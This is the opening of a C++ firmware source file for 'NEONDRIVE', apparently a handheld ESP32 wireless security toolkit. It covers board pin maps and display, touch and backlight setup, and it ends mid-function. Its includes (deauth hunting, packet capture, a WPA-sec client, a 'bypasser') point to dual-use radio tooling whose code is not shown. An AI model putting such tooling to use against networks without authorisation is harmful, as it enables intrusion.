// Main firmware entry point and UI orchestration for NEONDRIVE device targets.
#include <Arduino.h>
#include <SPI.h>
#include <Wire.h>
#if defined(NEONDRIVE_TARGET_M5TAB5)
// M5Tab5: M5Unified handles MIPI-DSI display init and GT911 touch via I²C.
// M5.Lcd (M5GFX) is aliased to 'tft' so all draw call sites are unchanged.
#include <M5Unified.h>
#include "device_profile_select.h"
#elif defined(NEONDRIVE_TARGET_M5CARDPUTER)
// Cardputer Adv: M5GFX via M5Cardputer library; 240×135 ST7789, keyboard input.
#include <M5Cardputer.h>
#include "device_profile_select.h"
#else
#include <TFT_eSPI.h>

#if defined(NEONDRIVE_TARGET_TDISPLAY_S3) || defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
#define NEONDRIVE_TARGET_BUTTON_NAV 1
#endif
#if defined(NEONDRIVE_TARGET_TDISPLAY_S3) && !defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
// This target is button-nav by default. Enable only for known touch variants.
#if defined(NEONDRIVE_TDISPLAY_S3_HAS_TOUCH) && (NEONDRIVE_TDISPLAY_S3_HAS_TOUCH == 1)
#define NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH 1
#endif
#endif
#if defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
#define NEONDRIVE_TARGET_TEMBED 1
#endif
#if defined(NEONDRIVE_TARGET_CYD24) || defined(NEONDRIVE_TARGET_CYD28) || defined(NEONDRIVE_TARGET_CYD35)
#define NEONDRIVE_TARGET_CYD 1
#endif
#if defined(NEONDRIVE_TARGET_CYD) && \
    (defined(NEONDRIVE_TARGET_TDISPLAY_S3) || defined(NEONDRIVE_TARGET_T_EMBED_CC1101) || \
     defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER))
#undef NEONDRIVE_TARGET_CYD
#endif
#if !defined(NEONDRIVE_TARGET_CYD) && !defined(NEONDRIVE_TARGET_TDISPLAY_S3) && \
    !defined(NEONDRIVE_TARGET_T_EMBED_CC1101) && !defined(NEONDRIVE_TARGET_M5TAB5) && \
    !defined(NEONDRIVE_TARGET_M5CARDPUTER)
#define NEONDRIVE_TARGET_CYD 1
#endif

#include "device_profile_select.h"
#if defined(NEONDRIVE_TARGET_CYD)
#include "board_variant.h"
#endif

#if !defined(NEONDRIVE_TARGET_BUTTON_NAV)
#include <XPT2046_Touchscreen.h>
#endif
#if defined(NEONDRIVE_TARGET_CYD28)
#include <XPT2046_Bitbang.h>
#endif
#endif // NEONDRIVE_USES_M5GFX / TFT_eSPI
#include <LittleFS.h>
#include <SD.h>
#if defined(NEONDRIVE_TARGET_TDISPLAY_S3) || defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
#include <SD_MMC.h>
#define ND_TDISPLAY_USE_SDMMC 1
#define SD SD_MMC
#endif
using fs::File;
#include <FS.h>
#include <ArduinoJson.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Update.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include <esp_heap_caps.h>
#include <esp_task_wdt.h>

#include <ctype.h>
#include <math.h>
#include <stdarg.h>
#include <time.h>
#include <freertos/semphr.h>
#include "neon_rf.h"
#include "hal/neon_hal.h"
#include "deauth_hunter.h"
#include "packetlab_wifi.h"
#include "dropbox_client.h"
#include "gps_service.h"
#include "hypercube_widget.h"
#include "wpasec_client.h"
#include "yoink_engine.h"
#include "usb_msc_tdisplay.h"
#include "wsl_bypasser.h"
#include "app_config.h"
#include "config_store.h"
#include "wifi_connect_service.h"

/*
  NEONDRIVE // CYD — Milestone D
  - Home screen menu
  - Config screen with LittleFS-backed /config.json
  - LOCKED CYD BASELINE: init order + landscape + invertDisplay(true)
  - Touch mapping baked to PRESET #5 (invertX only) for landscape USB-right
  - Coexistence guardrail: Android companion is WiFi-only. BLE/BT control paths are
    intentionally disabled until explicit coexistence validation is completed on CYD.
*/

#if defined(NEONDRIVE_TARGET_M5TAB5)
// ═══════════════════════════════════════════════════════════════════════════
// M5Stack Tab5 — ESP32-P4 (dual-core RISC-V @ 400 MHz, 32 MB PSRAM, 16 MB Flash)
//               + ESP32-C6 co-processor (WiFi 6 / BT 5).
// Display:  5" 1280×720 IPS MIPI-DSI, driven by M5GFX (M5.Lcd aliased as tft).
// Touch:    Goodix GT911 (I²C: SDA=GPIO31, SCL=GPIO32), owned by M5GFX.
//
// ── TOUCH — HOW IT WORKS (read before changing anything) ─────────────────
//
//  1. M5.begin() in setup() is the ONLY touch initialiser needed.
//     It runs the full PI4IOE I/O-expander reset sequence (8-bit OUT_SET
//     register writes), probes the GT911 / ST7123, and wires the coordinate
//     affine transform to match the display rotation.  Nothing else is needed.
//
//  2. M5.update() in loop() pumps the GT911 state machine each frame.
//
//  3. M5.Touch.getDetail(0) returns the current touch point.
//     Check isPressed() || wasPressed() for a reliable tap event.
//
// ── TOUCH — WHAT BREAKS IT ───────────────────────────────────────────────
//
//  ⚠ CRITICAL — SD CARD PIN COLLISION (historical, now resolved):
//    Pins verified from Tab5 schematic (2026-05-24). SPI mode:
//      MISO=GPIO39, CS=GPIO42, SCK=GPIO43, MOSI=GPIO44
//    None of these alias GT911 I²C (SDA=GPIO31, SCL=GPIO32).
//
//    Boot-time verification — GPIO32 must appear as I2C_MASTER_SCL, not
//    SPI_MASTER_MOSI, in the GPIO report printed after setup().
//
//  ✗ Do NOT call M5.Touch.begin() manually — M5GFX already ran it.
//  ✗ Do NOT pulse the PI4IOE expander manually — M5GFX uses a full 8-bit
//    OUT_SET write; bit-banging leaves LCD-reset lines floating.
//  ✗ Do NOT call tft.setRotation() more than once — the first post-begin()
//    call updates the touch affine; a second call drifts display vs touch.
//  ✗ Do NOT add tabTouchRecovery / tabForceTouchInit scaffolding — all prior
//    attempts failed because M5GFX owns the hardware at a lower level.
//
//  See CLAUDE.md §"M5Stack Tab5 — Touch Implementation" for the full story.
// ═══════════════════════════════════════════════════════════════════════════
static constexpr bool BOARD_HAS_TOUCH = true;
static constexpr bool BOARD_HAS_IMU   = true;
static constexpr bool BOARD_HAS_SD    = true;
static constexpr bool TFT_USES_SPI_BUS = false;
static constexpr int BOARD_TFT_ROTATION = 1;
static constexpr bool BOARD_TFT_INVERT = false;
static constexpr int PIN_LCD_POWER_ON = -1;
static constexpr int PIN_TFT_SCLK = -1;
static constexpr int PIN_TFT_MISO = -1;
static constexpr int PIN_TFT_MOSI = -1;
static constexpr int PIN_TFT_CS   = -1;
static constexpr int PIN_TOUCH_CS  = -1;
static constexpr int PIN_TOUCH_SDA = -1;
static constexpr int PIN_TOUCH_SCL = -1;
static constexpr int PIN_TOUCH_INT = -1;
static constexpr int PIN_TOUCH_RST = -1;
// Tab5 SPI3 SD card pins — verified from schematic 2026-05-24.
// None conflict with GT911 I²C (SDA=31, SCL=32).
static constexpr int PIN_SD_SCLK   = 43;
static constexpr int PIN_SD_MISO   = 39;
static constexpr int PIN_SD_MOSI   = 44;
static constexpr int PIN_SD_CS     = 42;
static constexpr int PIN_SW1       = -1;
// Backlight and RGB LED managed by M5GFX; no discrete PWM pins exposed here.
static constexpr int BL_PINS[] = {-1};
static constexpr uint8_t BL_PWM_CHANNELS[] = {4};
static constexpr int LED_PINS[] = {-1, -1, -1};
static constexpr uint8_t LED_PWM_CHANNELS[] = {0, 1, 2};

#elif defined(NEONDRIVE_TARGET_M5CARDPUTER)
// M5Stack Cardputer Advanced — ESP32-S3FN8 (8 MB flash, no PSRAM)
// Display: 1.14" ST7789V2 240×135, managed by M5GFX via M5Cardputer.
// Input: 56-key TCA8418 I²C keyboard (SDA=GPIO8, SCL=GPIO9, INT=GPIO11).
// SD: SPI — SCK=40, MISO=39, MOSI=14, CS=12.  No touch, no IMU.
static constexpr bool BOARD_HAS_TOUCH = false;
static constexpr bool BOARD_HAS_IMU   = false;
static constexpr bool BOARD_HAS_SD    = true;
static constexpr bool TFT_USES_SPI_BUS = false;  // M5GFX owns display
static constexpr int BOARD_TFT_ROTATION = 1;
static constexpr bool BOARD_TFT_INVERT = false;
static constexpr int PIN_LCD_POWER_ON = -1;
static constexpr int PIN_TFT_SCLK = -1;
static constexpr int PIN_TFT_MISO = -1;
static constexpr int PIN_TFT_MOSI = -1;
static constexpr int PIN_TFT_CS   = -1;
static constexpr int PIN_TOUCH_CS  = -1;
static constexpr int PIN_TOUCH_SDA = -1;
static constexpr int PIN_TOUCH_SCL = -1;
static constexpr int PIN_TOUCH_INT = -1;
static constexpr int PIN_TOUCH_RST = -1;
static constexpr int PIN_SD_SCLK  = 40;
static constexpr int PIN_SD_MISO  = 39;
static constexpr int PIN_SD_MOSI  = 14;
static constexpr int PIN_SD_CS    = 12;
static constexpr int PIN_NAV_NEXT   = -1;
static constexpr int PIN_NAV_SELECT = -1;
static constexpr int PIN_ENCODER_A  = -1;
static constexpr int PIN_ENCODER_B  = -1;
static constexpr int PIN_SW1 = -1;
// Backlight managed by M5GFX; no discrete PWM pins.
static constexpr int BL_PINS[] = {-1};
static constexpr uint8_t BL_PWM_CHANNELS[] = {4};
static constexpr int LED_PINS[] = {-1, -1, -1};
static constexpr uint8_t LED_PWM_CHANNELS[] = {0, 1, 2};

#elif (defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH) || defined(ARDUINO_LILYGO_T_DISPLAY_S3)) \
   && !defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
static constexpr bool BOARD_HAS_TOUCH = true;
static constexpr bool BOARD_HAS_IMU   = false;
static constexpr bool BOARD_HAS_SD = true;
static constexpr bool TFT_USES_SPI_BUS = false;
static constexpr int BOARD_TFT_ROTATION = 1;
static constexpr bool BOARD_TFT_INVERT = true;
static constexpr int PIN_LCD_POWER_ON = 15;

// TFT is 8-bit parallel on this board, so SPI TFT pins are unused.
static constexpr int PIN_TFT_SCLK = -1;
static constexpr int PIN_TFT_MISO = -1;
static constexpr int PIN_TFT_MOSI = -1;
static constexpr int PIN_TFT_CS   = -1;

static constexpr int PIN_TOUCH_CS = -1;
static constexpr int PIN_TOUCH_SDA = 18;
static constexpr int PIN_TOUCH_SCL = 17;
static constexpr int PIN_TOUCH_INT = 16;
static constexpr int PIN_TOUCH_RST = 21;
static constexpr uint8_t TOUCH_ADDR_CST_SELF = 0x15;    // CST816/CST820 family
static constexpr uint8_t TOUCH_ADDR_CST_MUTUAL = 0x1A;  // CST328 family
// T-Display-S3 TF Shield (SD_MMC 1-bit): CLK=11, CMD=13, D0=12
static constexpr int PIN_SD_SCLK  = 11; // SD_MMC CLK
static constexpr int PIN_SD_MISO  = 12; // SD_MMC D0
static constexpr int PIN_SD_MOSI  = 13; // SD_MMC CMD
static constexpr int PIN_SD_CS    = -1; // not used in SD_MMC mode
static constexpr int PIN_NAV_NEXT = BUTTON_1;
static constexpr int PIN_NAV_SELECT = BUTTON_2;
static constexpr int PIN_ENCODER_A = -1;
static constexpr int PIN_ENCODER_B = -1;
static constexpr int PIN_SW1 = -1;

// T-Display-S3 has one TFT backlight pin.
static constexpr int BL_PINS[] = {38};
static constexpr uint8_t BL_PWM_CHANNELS[] = {4};

// No discrete RGB status LED on T-Display-S3.
static constexpr int LED_PINS[] = {-1, -1, -1};
static constexpr uint8_t LED_PWM_CHANNELS[] = {0, 1, 2};
#elif defined(NEONDRIVE_TARGET_TEMBED)
// LilyGO T-Embed CC1101 Plus — ESP32-S3, 16MB flash, 8MB PSRAM
// Pins verified from official repo: examples/factory_test/utilities.h
// All SPI devices (display, CC1101, SD, nRF24) share GPIO 9/10/11 bus.
static constexpr bool BOARD_HAS_TOUCH = false;
static constexpr bool BOARD_HAS_IMU   = false;
static constexpr bool BOARD_HAS_SD    = true;
static constexpr bool TFT_USES_SPI_BUS = true;
static constexpr int  BOARD_TFT_ROTATION = 1;
static constexpr bool BOARD_TFT_INVERT = true;
static constexpr int  PIN_LCD_POWER_ON = -1;

// Shared SPI bus (BOARD_SPI_MOSI/MISO/SCK)
static constexpr int PIN_TFT_SCLK = 11;   // BOARD_SPI_SCK
static constexpr int PIN_TFT_MISO = 10;   // BOARD_SPI_MISO
static constexpr int PIN_TFT_MOSI = 9;    // BOARD_SPI_MOSI
static constexpr int PIN_TFT_CS   = 41;   // DISPLAY_CS

static constexpr int PIN_TOUCH_CS      = -1;
static constexpr int PIN_TOUCH_SDA     = -1;
static constexpr int PIN_TOUCH_SCL     = -1;
static constexpr int PIN_TOUCH_INT     = -1;
static constexpr int PIN_TOUCH_RST     = -1;
static constexpr uint8_t TOUCH_ADDR_CST_SELF   = 0x00;
static constexpr uint8_t TOUCH_ADDR_CST_MUTUAL = 0x00;

// SD card on shared SPI bus
static constexpr int PIN_SD_SCLK = 11;    // BOARD_SPI_SCK
static constexpr int PIN_SD_MISO = 10;    // BOARD_SPI_MISO
static constexpr int PIN_SD_MOSI = 9;     // BOARD_SPI_MOSI
static constexpr int PIN_SD_CS   = 13;    // BOARD_SD_CS

// Navigation / encoder
static constexpr int PIN_NAV_NEXT   = 6;  // BOARD_USER_KEY (side button)
static constexpr int PIN_NAV_SELECT = 0;  // ENCODER_KEY (also BOOT button)
static constexpr int PIN_ENCODER_A  = 4;  // ENCODER_INA
static constexpr int PIN_ENCODER_B  = 5;  // ENCODER_INB
static constexpr int PIN_SW1        = -1;

// CC1101 on shared SPI bus
static constexpr int PIN_CC1101_CS   = 12;  // BOARD_LORA_CS
static constexpr int PIN_CC1101_GDO0 = 3;   // BOARD_LORA_IO0 (GDO0 / IRQ)
static constexpr int PIN_CC1101_GDO2 = 38;  // BOARD_LORA_IO2
static constexpr int PIN_ANT_SW1     = 47;  // BOARD_LORA_SW1 (antenna band select)
static constexpr int PIN_ANT_SW0     = 48;  // BOARD_LORA_SW0

// nRF24L01 expansion module on shared SPI bus (Plus variant)
static constexpr int PIN_NRF24_CE  = 43;  // BOARD_NRF24_CE
static constexpr int PIN_NRF24_CS  = 44;  // BOARD_NRF24_CS
static constexpr int PIN_NRF24_IRQ = -1;  // not connected

// Power enable — must be set HIGH before using CC1101 or WS2812
static constexpr int PIN_PWR_EN = 15;     // BOARD_PWR_EN

// IR transceiver
static constexpr int PIN_IR_RX = 1;       // BOARD_IR_RX
static constexpr int PIN_IR_EN = 2;       // BOARD_IR_EN (TX enable)

static constexpr int BL_PINS[] = {21};
static constexpr uint8_t BL_PWM_CHANNELS[] = {4};

// WS2812B ring — 8 LEDs on GPIO 14
static constexpr int LED_PINS[] = {14, -1, -1};
static constexpr uint8_t LED_PWM_CHANNELS[] = {0, 1, 2};
#else
static constexpr bool BOARD_HAS_TOUCH = true;
static constexpr bool BOARD_HAS_IMU   = false;
static constexpr bool BOARD_HAS_SD = true;
static constexpr bool TFT_USES_SPI_BUS = true;
static constexpr int BOARD_TFT_ROTATION = CYD_TFT_ROTATION;
static constexpr bool BOARD_TFT_INVERT = CYD_TFT_INVERT;
static constexpr int PIN_LCD_POWER_ON = -1;

static constexpr int PIN_TFT_SCLK = CYD_PIN_TFT_SCLK;
static constexpr int PIN_TFT_MISO = CYD_PIN_TFT_MISO;
static constexpr int PIN_TFT_MOSI = CYD_PIN_TFT_MOSI;
static constexpr int PIN_TFT_CS   = CYD_PIN_TFT_CS;

static constexpr int PIN_TOUCH_CS = CYD_PIN_TOUCH_CS;
#if defined(NEONDRIVE_TARGET_CYD28)
static constexpr bool TOUCH_USES_SEPARATE_SPI = CYD_TOUCH_SEPARATE_SPI;
static constexpr int PIN_TOUCH_SPI_SCLK = CYD_PIN_TOUCH_SPI_SCLK;
static constexpr int PIN_TOUCH_SPI_MISO = CYD_PIN_TOUCH_SPI_MISO;
static constexpr int PIN_TOUCH_SPI_MOSI = CYD_PIN_TOUCH_SPI_MOSI;
static constexpr int PIN_TOUCH_IRQ = CYD_PIN_TOUCH_IRQ;
#else
static constexpr bool TOUCH_USES_SEPARATE_SPI = false;
static constexpr int PIN_TOUCH_SPI_SCLK = -1;
static constexpr int PIN_TOUCH_SPI_MISO = -1;
static constexpr int PIN_TOUCH_SPI_MOSI = -1;
static constexpr int PIN_TOUCH_IRQ = -1;
#endif
static constexpr int PIN_SD_SCLK  = CYD_PIN_SD_SCLK;
static constexpr int PIN_SD_MISO  = CYD_PIN_SD_MISO;
static constexpr int PIN_SD_MOSI  = CYD_PIN_SD_MOSI;
static constexpr int PIN_SD_CS    = CYD_PIN_SD_CS;
static constexpr int PIN_NAV_NEXT = -1;
static constexpr int PIN_NAV_SELECT = -1;
static constexpr int PIN_ENCODER_A = -1;
static constexpr int PIN_ENCODER_B = -1;
static constexpr int PIN_SW1 = CYD_PIN_SW1;

static constexpr int BL_PINS[] = {CYD_BL_PINS[0], CYD_BL_PINS[1]};
static constexpr uint8_t BL_PWM_CHANNELS[] = {CYD_BL_PWM_CHANNELS[0], CYD_BL_PWM_CHANNELS[1]};

static constexpr int LED_PINS[] = {CYD_LED_PINS[0], CYD_LED_PINS[1], CYD_LED_PINS[2]};  // R, G, B
static constexpr uint8_t LED_PWM_CHANNELS[] = {CYD_LED_PWM_CHANNELS[0], CYD_LED_PWM_CHANNELS[1], CYD_LED_PWM_CHANNELS[2]};
#endif
static bool backlightPwmReady = false;
static uint8_t backlightLevel = 255;  // Always full LCD backlight on boot

static bool statusLedPwmReady = false;

// Touch raw ranges are variant-defined for CYD targets.
#if defined(NEONDRIVE_TARGET_CYD)
static constexpr int RAW_X_MIN = CYD_TOUCH_RAW_X_MIN;
static constexpr int RAW_X_MAX = CYD_TOUCH_RAW_X_MAX;
static constexpr int RAW_Y_MIN = CYD_TOUCH_RAW_Y_MIN;
static constexpr int RAW_Y_MAX = CYD_TOUCH_RAW_Y_MAX;
#else
static constexpr int RAW_X_MIN = 250;
static constexpr int RAW_X_MAX = 3850;
static constexpr int RAW_Y_MIN = 250;
static constexpr int RAW_Y_MAX = 3850;
#endif
static int g_touchRawXMin = RAW_X_MIN;
static int g_touchRawXMax = RAW_X_MAX;
static int g_touchRawYMin = RAW_Y_MIN;
static int g_touchRawYMax = RAW_Y_MAX;
#if defined(NEONDRIVE_TARGET_CYD)
static bool g_touchSwapXY = CYD_TOUCH_SWAP_XY;
static bool g_touchInvertX = CYD_TOUCH_INVERT_X;
static bool g_touchInvertY = CYD_TOUCH_INVERT_Y;
static int g_touchZMin = CYD_TOUCH_Z_MIN;
#else
static bool g_touchSwapXY = false;
static bool g_touchInvertX = true;
static bool g_touchInvertY = false;
static int g_touchZMin = 80;
#endif

#if defined(NEONDRIVE_USES_M5GFX)
// M5.Display is a plain value member of M5Unified/M5Cardputer; binding a reference
// to it generates a compile-time-constant address and is safe regardless of
// static-initialization order.  Avoid M5.Lcd: it's a reference member whose
// internal pointer is only valid after M5Unified's constructor runs.
static M5GFX& tft = M5.Display;
#else
TFT_eSPI tft;
#if !defined(NEONDRIVE_TARGET_BUTTON_NAV)
XPT2046_Touchscreen ts(PIN_TOUCH_CS);
#endif
#if defined(NEONDRIVE_TARGET_CYD28)
XPT2046_Bitbang cyd28Touch(PIN_TOUCH_SPI_MOSI, PIN_TOUCH_SPI_MISO, PIN_TOUCH_SPI_SCLK, PIN_TOUCH_CS,
                           (uint16_t)ND_DISPLAY_W, (uint16_t)ND_DISPLAY_H);
#endif
#endif // NEONDRIVE_USES_M5GFX

static uint32_t g_touchDebounceUntilMs = 0;

#if defined(NEONDRIVE_TARGET_M5TAB5)
// pioarduino 55.03.38-1 (Arduino-ESP32 3.x / ESP-IDF 5.5) removed the old
// channel-based LEDC API. Stub it out so BL/LED init code compiles — these
// functions are never actually called on Tab5 (all BL/LED pins are -1).
static inline void ledcSetup(uint8_t, uint32_t, uint8_t) {}
static inline void ledcAttachPin(int, uint8_t) {}
#endif // NEONDRIVE_TARGET_M5TAB5

// M5Tab5: touch is fully managed by M5GFX autodetect inside M5.begin().
// No manual PI4IOE pulsing or M5.Touch.begin() calls needed here.

#ifndef ND_TOUCH_VISUAL_DEBUG
#define ND_TOUCH_VISUAL_DEBUG 0
#endif

static int g_touchDebugPrevX = -1;
static int g_touchDebugPrevY = -1;
static uint32_t g_touchDebugUntilMs = 0;

static void touchDebugDrawMarker(int x, int y) {
#if ND_TOUCH_VISUAL_DEBUG
  const int w = tft.width();
  const int h = tft.height();

  if (g_touchDebugPrevX >= 0 && g_touchDebugPrevY >= 0) {
    const int px = g_touchDebugPrevX;
    const int py = g_touchDebugPrevY;
    tft.drawCircle(px, py, 8, TFT_BLACK);
    tft.drawLine(px - 10, py, px + 10, py, TFT_BLACK);
    tft.drawLine(px, py - 10, px, py + 10, TFT_BLACK);
  }

  if (x < 0) x = 0;
  if (y < 0) y = 0;
  if (x >= w) x = w - 1;
  if (y >= h) y = h - 1;
  tft.drawCircle(x, y, 8, TFT_YELLOW);
  tft.drawLine(x - 10, y, x + 10, y, TFT_YELLOW);
  tft.drawLine(x, y - 10, x, y + 10, TFT_YELLOW);

  char buf[40];
  snprintf(buf, sizeof(buf), "touch x=%d y=%d", x, y);
  tft.fillRect(0, h - 14, w, 14, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(buf, 2, h - 12, 1);

  g_touchDebugPrevX = x;
  g_touchDebugPrevY = y;
  g_touchDebugUntilMs = millis() + 450;
#else
  (void)x;
  (void)y;
#endif
}

static void touchDebugTick() {
#if ND_TOUCH_VISUAL_DEBUG
  if ((int32_t)(g_touchDebugUntilMs - millis()) > 0) return;
  if (g_touchDebugPrevX < 0 || g_touchDebugPrevY < 0) return;
  const int px = g_touchDebugPrevX;
  const int py = g_touchDebugPrevY;
  tft.drawCircle(px, py, 8, TFT_BLACK);
  tft.drawLine(px - 10, py, px + 10, py, TFT_BLACK);
  tft.drawLine(px, py - 10, px, py + 10, TFT_BLACK);
  g_touchDebugPrevX = -1;
  g_touchDebugPrevY = -1;
#endif
}

// ---------- Utilities ----------
static int clampi(int v, int lo, int hi) {
  if (v < lo) return lo;
  if (v > hi) return hi;
  return v;
}

static int mapRawToRange(int raw, int rawMin, int rawMax, int outMaxExclusive) {
  raw = clampi(raw, rawMin, rawMax);
  long num = (long)(raw - rawMin) * (long)(outMaxExclusive - 1);
  long den = (long)(rawMax - rawMin);
  if (den <= 0) den = 1;
  return (int)(num / den);
}

static uint32_t hashText(const char* s) {
  uint32_t h = 2166136261u;
  if (!s) return h;
  while (*s) {
    h ^= (uint8_t)(*s++);
    h *= 16777619u;
  }
  return h;
}

static void backlightBringup() {
  if (PIN_LCD_POWER_ON >= 0) {
    pinMode(PIN_LCD_POWER_ON, OUTPUT);
    digitalWrite(PIN_LCD_POWER_ON, HIGH);
  }

  for (int pin : BL_PINS) {
    if (pin < 0) continue;
    pinMode(pin, OUTPUT);
    digitalWrite(pin, HIGH);
  }

#if !defined(NEONDRIVE_TARGET_BUTTON_NAV)
  // Quick blink test (2 blinks)
  for (int i = 0; i < 2; i++) {
    for (int pin : BL_PINS) {
      if (pin < 0) continue;
      digitalWrite(pin, LOW);
    }
    delay(120);
    for (int pin : BL_PINS) {
      if (pin < 0) continue;
      digitalWrite(pin, HIGH);
    }
    delay(120);
  }
#endif
}

static void initBacklightPwmIfNeeded() {
  if (backlightPwmReady) return;
  for (size_t i = 0; i < sizeof(BL_PINS) / sizeof(BL_PINS[0]); i++) {
    if (BL_PINS[i] < 0) continue;
    ledcSetup(BL_PWM_CHANNELS[i], 5000, 8);  // 8-bit brightness
    ledcAttachPin(BL_PINS[i], BL_PWM_CHANNELS[i]);
  }
  backlightPwmReady = true;
}

static void applyBacklightLevel(uint8_t level) {
  backlightLevel = level;
  initBacklightPwmIfNeeded();
  for (size_t i = 0; i < sizeof(BL_PINS) / sizeof(BL_PINS[0]); i++) {
    if (BL_PINS[i] < 0) continue;
    ledcWrite(BL_PWM_CHANNELS[i], backlightLevel);
  }
}

static void initStatusLedPwmIfNeeded() {
  if (LED_PINS[0] < 0) return;
  if (statusLedPwmReady) return;
  for (size_t i = 0; i < sizeof(LED_PINS) / sizeof(LED_PINS[0]); i++) {
    if (LED_PINS[i] < 0) continue;
    pinMode(LED_PINS[i], OUTPUT);
    ledcSetup(LED_PWM_CHANNELS[i], 5000, 8);
    ledcAttachPin(LED_PINS[i], LED_PWM_CHANNELS[i]);
  }
  statusLedPwmReady = true;
}

static void applyStatusLedState(uint8_t brightness, uint8_t red, uint8_t green, uint8_t blue) {
  if (LED_PINS[0] < 0) return;
  initStatusLedPwmIfNeeded();

  const uint8_t r = (uint8_t)(((uint16_t)red * (uint16_t)brightness) / 255);
  const uint8_t g = (uint8_t)(((uint16_t)green * (uint16_t)brightness) / 255);
  const uint8_t b = (uint8_t)(((uint16_t)blue * (uint16_t)brightness) / 255);

  // Active-low LED: 0=full ON, 255=OFF
  ledcWrite(LED_PWM_CHANNELS[0], 255 - r);
  ledcWrite(LED_PWM_CHANNELS[1], 255 - g);
  ledcWrite(LED_PWM_CHANNELS[2], 255 - b);
}

#if defined(NEONDRIVE_TARGET_BUTTON_NAV) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
static void tdisplayNavBuild();
static void tdisplayNavDrawHeaderStatus();
static void tdisplayNavDrawSelectedOutline();
static bool tdisplayNavConsumeRefreshRequest();
static void tdisplayRedrawCurrentScreen();
static bool keyboardNavHandleArrowOrEnter(neon_key_t k);
#endif

static void drawBorder() {
  const int w = tft.width();
  const int h = tft.height();
  tft.drawRect(0, 0, w, h, TFT_DARKGREY);
#if defined(NEONDRIVE_TARGET_BUTTON_NAV) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  tdisplayNavBuild();
  tdisplayNavDrawHeaderStatus();
  tdisplayNavDrawSelectedOutline();
#endif
}

static int display_get_width() { return tft.width(); }
static int display_get_height() { return tft.height(); }

// ---------- Touch ----------

struct TouchState {
  bool down;
  int x;
  int y;
  int z;
  int rx;
  int ry;
};

static int g_lastTouchRawX = -1;
static int g_lastTouchRawY = -1;
static int g_lastTouchRawZ = 0;

#if defined(NEONDRIVE_TARGET_BUTTON_NAV) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
static bool tdisplayHandleButtonInput(int& outX, int& outY);
#endif

#if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
enum class TDisplayTouchController : uint8_t {
  NONE = 0,
  CST_SELF = 1,
  CST_MUTUAL = 2,
};

static TDisplayTouchController g_tdisplayTouchController = TDisplayTouchController::NONE;
static bool g_tdisplayTouchPresent = false;
static uint8_t g_tdisplayTouchAddr = 0;
static bool g_tdisplayTouchAxesLocked = false;
static bool g_tdisplayTouchLandscapeCoords = false;

static bool tdisplayI2cProbe(uint8_t addr) {
  Wire.beginTransmission(addr);
  return (Wire.endTransmission() == 0);
}

static bool tdisplayI2cRead8(uint8_t addr, uint8_t reg, uint8_t* out, size_t len) {
  if (!out || len == 0) return false;
  Wire.beginTransmission(addr);
  Wire.write(reg);
  if (Wire.endTransmission(false) != 0) return false;
  size_t got = Wire.requestFrom((int)addr, (int)len);
  if (got != len) return false;
  for (size_t i = 0; i < len; i++) out[i] = Wire.read();
  return true;
}

static bool tdisplayI2cRead16(uint8_t addr, uint16_t reg, uint8_t* out, size_t len) {
  if (!out || len == 0) return false;
  Wire.beginTransmission(addr);
  Wire.write((uint8_t)(reg >> 8));
  Wire.write((uint8_t)(reg & 0xFF));
  if (Wire.endTransmission(false) != 0) return false;
  size_t got = Wire.requestFrom((int)addr, (int)len);
  if (got != len) return false;
  for (size_t i = 0; i < len; i++) out[i] = Wire.read();
  return true;
}

static bool tdisplayReadTouchRaw(int& outRawX, int& outRawY, int& outZ) {
  outRawX = -1;
  outRawY = -1;
  outZ = 0;

  if (!g_tdisplayTouchPresent) return false;

  if (g_tdisplayTouchController == TDisplayTouchController::CST_SELF) {
    uint8_t data[5] = {0};
    if (!tdisplayI2cRead8(g_tdisplayTouchAddr, 0x02, data, sizeof(data))) return false;
    const uint8_t points = data[0] & 0x0F;
    if (points == 0) return false;
    outRawX = ((int)(data[1] & 0x0F) << 8) | data[2];
    outRawY = ((int)(data[3] & 0x0F) << 8) | data[4];
    outZ = points;
    return true;
  }

  if (g_tdisplayTouchController == TDisplayTouchController::CST_MUTUAL) {
    uint8_t data[6] = {0};
    if (!tdisplayI2cRead16(g_tdisplayTouchAddr, 0xD000, data, sizeof(data))) return false;
    uint8_t points = data[5] & 0x0F;
    if (points == 0) points = data[0] & 0x0F;
    if (points == 0) return false;
    outRawX = ((int)data[1] << 4) | ((data[3] >> 4) & 0x0F);
    outRawY = ((int)data[2] << 4) | (data[3] & 0x0F);
    outZ = points;
    return true;
  }

  return false;
}

static void tdisplayMapTouchToScreen(int rawX, int rawY, int& outX, int& outY) {
  const int w = tft.width();
  const int h = tft.height();

  // First touch determines whether controller is reporting portrait or landscape axes.
  if (!g_tdisplayTouchAxesLocked) {
    // If X exceeds screen height, we are almost certainly already in landscape coords.
    // If Y exceeds screen height, controller is in portrait coords.
    if (rawX > h) {
      g_tdisplayTouchLandscapeCoords = true;
      g_tdisplayTouchAxesLocked = true;
      Serial.println("[touch] axis mode: landscape");
    } else if (rawY > h) {
      g_tdisplayTouchLandscapeCoords = false;
      g_tdisplayTouchAxesLocked = true;
      Serial.println("[touch] axis mode: portrait");
    }
  }

  if (g_tdisplayTouchLandscapeCoords) {
    outX = clampi(rawX, 0, w - 1);
    outY = clampi(rawY, 0, h - 1);
    return;
  }

  // Default for T-Display-S3 touch modules: portrait touch axes with TFT rotation(1).
  outX = clampi(rawY, 0, w - 1);
  outY = clampi((h - 1) - rawX, 0, h - 1);
}

static void tdisplayTouchResetPulse() {
  pinMode(PIN_TOUCH_RST, OUTPUT);
  digitalWrite(PIN_TOUCH_RST, HIGH);
  delay(2);
  digitalWrite(PIN_TOUCH_RST, LOW);
  delay(12);
  digitalWrite(PIN_TOUCH_RST, HIGH);
